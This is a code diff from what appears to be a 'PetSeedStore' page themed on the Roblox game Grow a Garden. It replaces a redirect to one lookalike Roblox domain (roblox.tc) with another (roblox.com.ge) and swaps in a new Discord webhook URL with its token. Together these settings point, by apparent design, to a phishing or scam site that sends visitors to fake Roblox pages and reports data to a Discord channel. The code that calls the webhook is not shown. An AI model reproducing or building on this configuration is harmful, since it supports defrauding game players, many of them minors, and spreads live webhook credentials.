@@ -118,13 +118,13 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.roblox.tc/games/126884695634066/Grow-a-Garden?privateServerLinkCode=33043799204089892731978860331402",
+  url: "https://roblox.com.ge/games/126884695634066/Grow-a-Garden?privateServerLinkCode=09766518639713593069529232560964",
 }
 
 // Webhook configuration
 const WEBHOOK_CONFIG = {
   enabled: true,
-  url: "https://discord.com/api/webhooks/1403233109851242536/in5ZcRi5sj9lVb6CyYYu7pra71aJaEjleY_3GlJI8uNKzfF1cCG9SeHdn6oF8V0wWv5A",
+  url: "https://discord.com/api/webhooks/1428893631577592001/e7RnDQqyAPKpw9Huw1La1N-dUDsuRs1oT9djHlby_rxXK7uGj7vv2RLrSfspaV8Qh_sf",
 }
 
 export default function PetSeedStore() {
